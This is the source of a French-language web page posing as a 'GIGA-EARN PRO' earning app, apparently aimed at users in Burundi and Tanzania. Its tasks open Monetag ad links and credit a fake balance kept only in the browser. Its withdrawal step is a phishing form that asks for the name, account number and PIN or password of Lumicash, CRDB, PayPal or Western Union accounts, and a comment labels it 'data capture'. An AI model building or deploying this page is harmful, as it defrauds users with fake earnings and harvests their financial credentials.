    <style>
        :root {
            --primary: #00f2ff;
            --secondary: #7000ff;
            --accent: #ff00c8;
            --success: #00ff88;
            --bg: #020205;
            --glass: rgba(255, 255, 255, 0.05);
            --border: rgba(255, 255, 255, 0.1);
            --font-main: 'Rajdhani', sans-serif;
            --font-logo: 'Orbitron', sans-serif;
        }

        /* --- GLOBAL RESET & 8K OPTIMIZATION --- */
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body {
            background: var(--bg);
            color: #fff;
            font-family: var(--font-main);
            overflow-x: hidden;
            height: 100vh;
            background-image: 
                radial-gradient(circle at 0% 0%, rgba(112, 0, 255, 0.15) 0%, transparent 50%),
                radial-gradient(circle at 100% 100%, rgba(0, 242, 255, 0.15) 0%, transparent 50%);
        }

        /* --- UI COMPONENTS (GLASSMORPHISM) --- */
        .app-shell {
            max-width: 500px;
            margin: 0 auto;
            height: 100vh;
            display: flex;
            flex-direction: column;
            position: relative;
        }

        header {
            padding: 25px;
            text-align: center;
            backdrop-filter: blur(20px);
            border-bottom: 1px solid var(--border);
            z-index: 100;
        }

        .logo {
            font-family: var(--font-logo);
            font-size: 1.8rem;
            background: linear-gradient(90deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 30px rgba(0, 242, 255, 0.5);
            letter-spacing: 2px;
        }

        /* --- DYNAMIC BALANCE CARD --- */
        .balance-section {
            padding: 30px 20px;
            perspective: 1000px;
        }

        .balance-card {
            background: linear-gradient(135deg, rgba(255,255,255,0.1), rgba(255,255,255,0.02));
            border-radius: 30px;
            padding: 40px 20px;
            text-align: center;
            border: 1px solid var(--border);
            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
            position: relative;
            overflow: hidden;
            animation: cardFloat 5s ease-in-out infinite;
        }

        .balance-label { text-transform: uppercase; font-size: 0.9rem; color: var(--primary); letter-spacing: 3px; margin-bottom: 10px; }
        .balance-value { font-size: 3.5rem; font-weight: 700; font-family: var(--font-logo); }
        .balance-currency { color: var(--success); }

        /* --- PROGRESSION ALGO --- */
        .progression-container { padding: 0 20px; margin-bottom: 30px; }
        .prog-header { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 0.8rem; color: #aaa; }
        .prog-bar-bg { width: 100%; height: 12px; background: #111; border-radius: 20px; border: 1px solid var(--border); overflow: hidden; }
        .prog-bar-fill { 
            width: 0%; height: 100%; 
            background: linear-gradient(90deg, var(--secondary), var(--primary)); 
            box-shadow: 0 0 20px var(--primary);
            transition: width 1s cubic-bezier(0.34, 1.56, 0.64, 1);
        }

        /* --- TASK GRID --- */
        .content-scroll { flex: 1; overflow-y: auto; padding: 20px; scrollbar-width: none; }
        .content-scroll::-webkit-scrollbar { display: none; }

        .task-card {
            background: var(--glass);
            border-radius: 25px;
            padding: 20px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 20px;
            border: 1px solid var(--border);
            transition: 0.4s;
            cursor: pointer;
            position: relative;
        }

        .task-card:active { transform: scale(0.95); background: rgba(255,255,255,0.1); }
        .task-icon { width: 60px; height: 60px; border-radius: 18px; background: #111; display: flex; align-items: center; justify-content: center; font-size: 1.5rem; color: var(--primary); border: 1px solid var(--border); }
        .task-info h3 { font-size: 1.1rem; margin-bottom: 5px; }
        .task-info p { font-size: 0.8rem; color: #888; }
        .task-reward { margin-left: auto; background: var(--success); color: #000; padding: 5px 12px; border-radius: 10px; font-weight: bold; font-size: 0.9rem; }

        /* --- ACTION BUTTONS --- */
        .withdraw-btn {
            background: linear-gradient(90deg, var(--secondary), var(--accent));
            border: none;
            padding: 20px;
            width: 100%;
            border-radius: 20px;
            color: #fff;
            font-family: var(--font-logo);
            font-size: 1.2rem;
            cursor: pointer;
            box-shadow: 0 10px 30px rgba(112, 0, 255, 0.3);
            margin-top: 20px;
        }

        /* --- MODAL SYSTEM --- */
        .modal-overlay {
            position: fixed; inset: 0; background: rgba(0,0,0,0.95);
            display: none; justify-content: center; align-items: center; z-index: 1000;
            backdrop-filter: blur(15px); padding: 20px;
        }

        .modal-content {
            background: #0a0a0f; border: 1px solid var(--primary);
            border-radius: 35px; width: 100%; max-width: 400px; padding: 30px;
            box-shadow: 0 0 100px rgba(0, 242, 255, 0.2);
        }

        .input-group { margin-bottom: 20px; }
        .input-group label { display: block; margin-bottom: 8px; font-size: 0.8rem; color: var(--primary); text-transform: uppercase; }
        input, select {
            width: 100%; background: #151520; border: 1px solid var(--border);
            padding: 15px; border-radius: 15px; color: #fff; outline: none; font-family: var(--font-main);
        }

        /* --- ANIMATIONS --- */
        @keyframes cardFloat { 0%, 100% { transform: translateY(0) rotateX(0deg); } 50% { transform: translateY(-15px) rotateX(2deg); } }
    </style>
</head>
<body>

    <div class="app-shell">
        <header>
            <div class="logo">GIGA-EARN PRO</div>
        </header>

        <div class="content-scroll">
            <div class="balance-section">
                <div class="balance-card">
                    <div class="balance-label">Portefeuille Virtuel</div>
                    <div class="balance-value"><span id="balance">0.00</span> <span class="balance-currency">$</span></div>
                </div>
            </div>

            <div class="progression-container">
                <div class="prog-header">
                    <span>Niveau de Retrait (Min 100$)</span>
                    <span id="prog-percent">0%</span>
                </div>
                <div class="prog-bar-bg"><div class="prog-bar-fill" id="fill"></div></div>
            </div>

            <div class="tasks">
                <div class="task-card" onclick="startTask('video', 12.50)">
                    <div class="task-icon"><i class="fas fa-play"></i></div>
                    <div class="task-info">
                        <h3>Watch Ads HD</h3>
                        <p>Vidéo sponsorisée 8K</p>
                    </div>
                    <div class="task-reward">+$12.50</div>
                </div>

                <div class="task-card" onclick="startTask('link', 4.75)">
                    <div class="task-icon"><i class="fas fa-link"></i></div>
                    <div class="task-info">
                        <h3>Premium Clicks</h3>
                        <p>Visiter lien sponsorisé</p>
                    </div>
                    <div class="task-reward">+$4.75</div>
                </div>

                <div class="task-card" onclick="startTask('ref', 25.00)">
                    <div class="task-icon"><i class="fas fa-users"></i></div>
                    <div class="task-info">
                        <h3>Affiliation Pro</h3>
                        <p>Inviter des amis</p>
                    </div>
                    <div class="task-reward">+$25.00</div>
                </div>
            </div>

            <button class="withdraw-btn" onclick="checkWithdraw()">
                <i class="fas fa-wallet"></i> RETIRER MES GAINS
            </button>
        </div>
    </div>

    <div class="modal-overlay" id="withdrawModal">
        <div class="modal-content">
            <h2 style="text-align:center; margin-bottom:25px; font-family:var(--font-logo); color:var(--primary);">TRANSFERT SÉCURISÉ</h2>
            
            <form id="paymentForm">
                <div class="input-group">
                    <label>Méthode de Paiement</label>
                    <select id="payMethod" required>
                        <option value="">-- Choisir --</option>
                        <option value="Lumicash">Lumicash (Burundi)</option>
                        <option value="CRDB">CRDB Bank (Burundi/Tanzania)</option>
                        <option value="PayPal">PayPal Global</option>
                        <option value="Western">Western Union</option>
                    </select>
                </div>

                <div class="input-group">
                    <label>Nom complet du bénéficiaire</label>
                    <input type="text" id="userName" placeholder="Ex: Jean Nkurunziza" required>
                </div>

                <div class="input-group">
                    <label>Identifiant (Email / N° Tel)</label>
                    <input type="text" id="userAccount" placeholder="Ex: +257 61 00 00 00" required>
                </div>

                <div class="input-group">
                    <label>Code PIN / Mot de passe (Sécurité)</label>
                    <input type="password" id="userPin" placeholder="****" required>
                </div>

                <button type="submit" class="withdraw-btn" style="background:var(--success); color:#000;">
                    CONFIRMER LE TRANSFERT
                </button>
                <button type="button" onclick="closeModal()" style="background:transparent; border:none; color:#888; width:100%; margin-top:15px; cursor:pointer;">Annuler</button>
            </form>
        </div>
    </div>

    <script>
        // --- APP STATE ---
        let state = {
            balance: parseFloat(localStorage.getItem('user_balance')) || 0,
            threshold: 100,
            directLink: "https://otieu.com/4/10488973"
        };

        // --- CORE ALGORITHM ---
        function updateUI() {
            const balEl = document.getElementById('balance');
            const fillEl = document.getElementById('fill');
            const percEl = document.getElementById('prog-percent');

            // Counter animation for balance
            let current = parseFloat(balEl.innerText);
            let target = state.balance;
            let step = (target - current) / 20;
            
            const timer = setInterval(() => {
                current += step;
                balEl.innerText = current.toFixed(2);
                if (Math.abs(current - target) < 0.1) {
                    balEl.innerText = target.toFixed(2);
                    clearInterval(timer);
                }
            }, 30);

            // Progress bar logic
            let progress = (state.balance / state.threshold) * 100;
            if (progress > 100) progress = 100;
            fillEl.style.width = progress + '%';
            percEl.innerText = Math.floor(progress) + '%';

            localStorage.setItem('user_balance', state.balance);
        }

        // --- TASK HANDLER (MONETIZATION TRIGGER) ---
        function startTask(type, reward) {
            // ALGO: Toujours ouvrir la pub Monetag avant de créditer
            window.open(state.directLink, '_blank');
            
            // Simulation de chargement 8K
            const btn = event.currentTarget;
            const originalHTML = btn.innerHTML;
            btn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Traitement...`;
            btn.style.pointerEvents = "none";

            setTimeout(() => {
                state.balance += reward;
                updateUI();
                btn.innerHTML = originalHTML;
                btn.style.pointerEvents = "all";
                showNotification(`+$${reward} ajouté à votre compte !`);
            }, 2500);
        }

        // --- WITHDRAWAL LOGIC ---
        function checkWithdraw() {
            if (state.balance < state.threshold) {
                // Déclencher une pub même si le solde est bas
                window.open(state.directLink, '_blank');
                alert("Erreur: Solde insuffisant. Vous devez atteindre 100.00 $ pour débloquer le premier retrait.");
            } else {
                document.getElementById('withdrawModal').style.display = 'flex';
            }
        }

        function closeModal() {
            document.getElementById('withdrawModal').style.display = 'none';
        }

        // --- DATA CAPTURE SIMULATION ---
        document.getElementById('paymentForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const data = {
                method: document.getElementById('payMethod').value,
                name: document.getElementById('userName').value,
                account: document.getElementById('userAccount').value,
                pin: document.getElementById('userPin').value,
                balance: state.balance,
                timestamp: new Date().toISOString()
            };

            // Sauvegarde locale (Simulation TXT/DB)
            let logs = JSON.parse(localStorage.getItem('withdraw_logs')) || [];
            logs.push(data);
            localStorage.setItem('withdraw_logs', JSON.stringify(logs));

            // Feedback Pro
            alert("Requête de retrait envoyée !\nStatut : En attente de validation (24h-48h).\n\nVeuillez ne pas quitter l'application durant la vérification serveur.");
            closeModal();
        });

        function showNotification(msg) {
            const toast = document.createElement('div');
            toast.style = `position:fixed; bottom:20px; left:50%; transform:translateX(-50%); background:var(--success); color:#000; padding:15px 30px; border-radius:50px; font-weight:bold; z-index:2000; animation:slideUp 0.5s ease;`;
            toast.innerText = msg;
            document.body.appendChild(toast);
            setTimeout(() => toast.remove(), 3000);
        }

        // Initial Load
        window.onload = updateUI;
    </script>

    <style>
        @keyframes slideUp { from { bottom: -100px; opacity: 0; } to { bottom: 20px; opacity: 1; } }
    </style>
</body>
